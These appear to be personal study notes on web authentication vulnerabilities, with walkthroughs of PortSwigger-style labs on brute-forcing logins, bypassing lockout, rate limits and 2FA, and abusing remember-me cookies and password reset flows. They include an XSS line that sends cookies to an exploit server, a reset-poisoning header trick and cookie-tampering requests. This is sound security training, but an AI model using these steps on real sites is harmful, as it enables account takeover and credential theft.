# Authentication Vulnerability (severe)

## What is Authentication?

*Authentication is the process of verifying the identity of a given user or client that he/she is what he/she is claims to be.*

3 category of Authentication :

1 ) knowledge factor : This mechanisms are like knowledge based questions or captcha etc. which user may know 

2 ) possession factor : This Mechanisms are physical object like mobile phone, security token, QR based, etc.

3 ) inherence factor  : This Mechanisms are biometrics or pattern of different behaviors.

## Authentication  vs Authorization :

Authentication : *Authentication is the process of verifying that a user really is who they claim to be*

Authorization : *Authorization involves verifying whether a user is allowed to do something.*

first, while login application tries to verify that who is attempting is really that user and if he is authenticated, after that application determines his permissions that what he is allowed to do on application.

## How do Authentication vulnerabilities arise?

It mainly occur in 2 ways :

1 ) When authentication mechanism are weak because they fail to prevent brute-force attack

2 ) Logic Flaws or poor coding in the implements allow attacker to bypass authentication mechanism, it's called "broken authentication"

## Impact of vulnerable Authentication :

either bypassed authentication or has brute-forced their way into another user's account, attacker has access to all the data and functionality that the compromised account has. high privileged account like sys. administrator will allow to take over full control of system or internal infrastructure.

Even compromising a low-privileged account might still grant an attacker access to data that they otherwise shouldn't have, such as commercially sensitive business information. Even if the account does not have access to any sensitive data, it might still allow the attacker to access additional pages, which provide a further attack surface.

## Vulnerabilities in Authentication mechanisms : (in separate section)

There are 3 most common areas where authentication  vulnerability may occur :

1 ) Vulnerability in Password Based Login

2 ) Vulnerability in Multi-factor authentication

3 ) Vulnerability in other Authentication Mechanism

## **1 . Vulnerability in Password Based Login**

*Brute-force attacks :*

Brute forcing common username and password list may lead to account take over many time. it may occur in 3 ways

*Different Status Code or header length :*

*Different Error Message :*

*Different Response time :*

- lab-1 solution
    
    try login with random username and password , monitor request and response through burp history, now send request to intruder and mark username and attack type sniper and paste list in payload and start attack, by different response length we got username, now attack with password list.
    
- lab-2 solution
    
    try login with random username and password, monitor request and response through burp history, now send request to intruder and mark username and attack type sniper and paste list in payload and in grep extract select error message and start attack, after attack in 1 username . is missing that showing different in error message, use that username with password list and lab will be solved
    
- lab-3 solution
    
    try login with random username and password , monitor request and response through burp history, now send request to repeater and increase password length to more than 100, it will show time delay in response. so with long password send request to intruder and set username position
    

*Flawed brute-force protection :*

after some guesses application may block ip for some time to prevent brute force.

- Locking the account that the remote user is trying to access if they make too many failed login attempts
- Blocking the remote user's IP address if they make too many login attempts in quick succession

but in some cases if we enter correct username and password, that may be ours so brute force protector count may be 0 and we can try further brute force.

- Lab Solution
    
    try login with random username and password , monitor request and response through burp history, now send request to repeater, send false password for sometime, after 2 false request application is blocking our IP, after unblocking try wrong id pass pair for 2 time and 3rd time try correct id pass pair now again try incorrect pair, if it doesn't block you then craft username and password that 2 wrong user/pass with 1 successive user-pass pair which will bypass flawed protection and will let u bruteforce, get correct username and password by individual attack based on errors and get correct username & password.
    

*Account Locking :*

One way in which websites try to prevent brute-forcing is to lock the account if certain suspicious criteria are met, usually a set number of failed login attempts. Just as with normal login errors, responses from the server indicating that an account is locked can also help an attacker to enumerate usernames.

some way to figure out account locking :

1. Establish a list of candidate usernames that are likely to be valid. This could be through username enumeration or simply based on a list of common usernames.
2. Decide on a very small shortlist of passwords that you think at least one user is likely to have. Crucially, the number of passwords you select must not exceed the number of login attempts allowed. For example, if you have worked out that limit is 3 attempts, you need to pick a maximum of 3 password guesses.
3. Using a tool such as Burp Intruder, try each of the selected passwords with each of the candidate usernames. This way, you can attempt to brute-force every account without triggering the account lock. You only need a single user to use one of the three passwords in order to compromise an account.

Account locking also fails to protect against credential stuffing attacks.

- Lab Solution
    
    try login with random username and password , monitor request and response through burp history, now send request to intruder and select attack type cluster bomb and select username and password=x$$ and add username and 2nd payload to null and count=5, now we get difference in length at intruder attack that's username now select password and attack type sniper and spray with correct username, use grep extract to get true id-pass based on error.
    

*User Rate limiting :*

In this case, making too many login requests within a short period of time causes your IP address to be blocked. Typically, the IP can only be unblocked in one of the following ways:

- Automatically after a certain period of time has elapsed
- Manually by an administrator
- Manually by the user after successfully completing a CAPTCHA

As the limit is based on the rate of HTTP requests sent from the user's IP address, it is sometimes also possible to bypass this defense if you can work out how to guess multiple passwords with a single request.

- Lab Solution
    
    try login with random username and password , monitor request and response through burp history, now send request to repeater, now craft payload in JSON format that has 1 known username and password separated by "","" and add it to header of request and show response that you have been logged in.
    

Some other techniques are *HTTP basic authentication* in which authentication cred or token are sent in header using simple encryption technique

---

## **2 . Vulnerability in Multi-Factor Authentication**

verifying biometric factors is almost impractical. where 2FA is possible which is made up from traditional password + verification code from Out-of-Band device in possession.

security enhanced when it use different vectors for verifying instead of both same factor in different ways that cause similarity. but poor implementation make it more vulnerable.

*2FA tokens :*

verification codes are read by users from physical device. so many website provides dedicated device such as RSA or inbuilt keyboard that use for safe input. this devices can also generate verification code directly. many websites use mobile app like google authenticator too. some websites send verification code as text to user's mobile phone. in last method, code is being transmitted instead of generating on device itself, code interception can occur here. SMS can be captured using `SIM Swapping`.

*Bypassing 2FA :*

If the user is first prompted to enter a password, and then prompted to enter a verification code on a separate page, the user is effectively in a "logged in" state before they have entered the verification code. In this case, it is worth testing to see if you can directly skip to "logged-in only" pages after completing the first authentication step. Occasionally, you will find that a website doesn't actually check whether or not you completed the second step before loading the page.

- Lab Solution :
    
    first login with our account now we will get 2FA verification code by mail, go to account page after entering OTP. note URL and logout, now login using victim's credential when it ask for 2FA code change URL to /my-account
    

*Flawed 2FA verification logic :*

 Sometimes flawed logic in two-factor authentication means that after a user has completed the initial login step, the website doesn't adequately verify that the same user is completing the second step.

login with normal credential :

> POST /login-steps/first HTTP/1.1
> 

> Host: vulnerable-website.com
> 

> ...
> 

> username=carlos&password=qwerty
> 

this will then assigned a cookie related to account before 2nd verification

response from server

> HTTP/1.1 200 OK
> 

> Set-Cookie: account=carlos
> 

next request

> GET /login-steps/second HTTP/1.1
> 

> Cookie: account=carlos
> 

at next request it will send that cookie along with verification code :

> POST /login-steps/second HTTP/1.1
> 

> Host: vulnerable-website.com
> 

> Cookie: account=carlos
> 

> ...
> 

> verification-code=123456
> 

attacker change value of cookie to arbitrary value at submitting code.

> POST /login-steps/second HTTP/1.1
> 

> Host: vulnerable-website.com
> 

> Cookie: account=victim-user
> 

> ...
> 

> verification-code=123456
> 

it's dangerous if attacker gets true code by bruteforcing that code.

- Lab Solution :
    
    login using our id password and entering false 2FA code, now send this request to intruder and change username to carlos and select MFA field for sniper attack, go to payload set to bruteforcer and payload 0-9, min & max length to 4 and min fraction to 0. we can get login by noticing 302 http code.
    

*Brute-forcing 2FA verification codes :*

As with passwords, websites need to take steps to prevent brute-forcing of the 2FA verification code. This is especially important because the code is often a simple 4 or 6-digit number. Without adequate brute-force protection, cracking such a code is trivial.

Some websites attempt to prevent this by automatically logging a user out if they enter a certain number of incorrect verification codes. This is ineffective in practice because an advanced attacker can even automate this multi-step process by [creating macros](https://portswigger.net/burp/documentation/desktop/options/sessions#macros) for Burp Intruder. The [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988) extension can also be used for this purpose.

- Lab Solution : (pending)

---

## **3 . Vulnerability in other authentication mechanisms :**

*Keeping users logged in :*

A common feature is the option to stay logged in even after closing a browser session. This is usually a simple checkbox labeled something like "Remember me" or "Keep me logged in". This functionality is often implemented by generating a "remember me" token of some kind, which is then stored in a persistent cookie. this cookie allow you to bypass login. However, some websites generate this cookie based on a predictable concatenation of static values, such as the username and a timestamp. basic encryption over this predictable cookies are also not secure. only salting is good way to make it safe. Even if the attacker is not able to create their own account, they may still be able to exploit this vulnerability. Using the usual techniques, such as XSS, an attacker could steal another user's "remember me" cookie and deduce how the cookie is constructed from that. If the website was built using an open-source framework, the key details of the cookie construction may even be publicly documented.

- Lab-1 Solution :
    
    login with username and password, notice that `Update email` is only available when logged-in. now notice /my-account page having `stay-logged-in` cookie try to decode using inspector tab it's username:md5hash this hash may be password, use google to check if it's md5. now send latest /my-account to intruder and select stay-logged-in cookie and add payload passwords than set 3 payload processing rule 1st convert to md5 hash, 2nd "carlos:" prefix, 3rd encode into base64-encoiding , last add grep match rule *Update mail* to extract true cookie to login.
    
- Lab-2 Solution :
    
    login with your credentials and observe cookie, now post has comment section which is vulnerable to XSS. so write following code in comment
    
    `<script>document.location='link of exploit server'+document.cookie</script>`
    
    now access your server's log it has get request with stay-logged-in now first decode base64 and then remove prefix and google md5 decoder and get password, login and delete your account.
    

*Resetting user passwords :*

*Sending passwords by email :*

It should go without saying that sending users their current password should never be possible if a website handles passwords securely in the first place. Instead, some websites generate a new password and send this to the user via email. avoid send password over insecure communication

*Resetting passwords using a URL :*

[http://vulnerable-website.com/reset-password?user=victim-user](http://vulnerable-website.com/reset-password?user=victim-user)

avoid this kind of URL & have URL with random sequence of character like..

[http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8](http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8)

However, some websites fail to also validate the token again when the reset form is submitted. In this case, an attacker could simply visit the reset form from their own account, delete the token, and leverage this page to reset an arbitrary user's password.

- Lab Solution :
    
    try *forget your password?* functionality with correct username & password and check your mail, it has random session token `/forgot-password?temp-forgot-password-token=xyz` , change password for your account. now watch requests in burp history. find `POST /forgot-password?temp-forgot-password-token` send it to repeater now try to change password after removing token's value from URL and header. though password is getting changed with 302 code. now change username to carlos and password u want, it will also change carlos password, login through browser with new credentials.
    
- Lab-2 Solution:
    
    in forgot your password? functionality and change your user's password, mail will be sent. mailbox is in exploit server note URL with random token, go to burp history & search POST /forgot-password and send to repeater. it contains username change it to carlos & add header X-Forwarded-Host: 'expolit-server-link-w/o-https://' send request 200 will be there. now check your exploit server GET /forgot-password?temp-token=xyz, select token and now take URL for your user from your mail client and change token to carlos's token and change carlos password by browsing. login through carlos account.
    

*Changing user passwords :*

Typically, changing your password involves entering your current password and then the new password twice. These pages fundamentally rely on the same process for checking that usernames and current passwords match as a normal login page does. Therefore, these pages can be vulnerable to the same techniques. Password change functionality can be particularly dangerous if it allows an attacker to access it directly without being logged in as the victim user.

- Lab Solution:
    
    login with your username and password now use change password functionality and enter 2 same password. now notice this request in burp history. manipulate functionality that if username and password are true but new password will different then it will lock account. and if current password will be wrong then it will show message current password do not match. send this request intruder change user to carlos select password and paste list with 2 different password and grep match error. we will get carlos password here. with password change it to new password and login
    

---
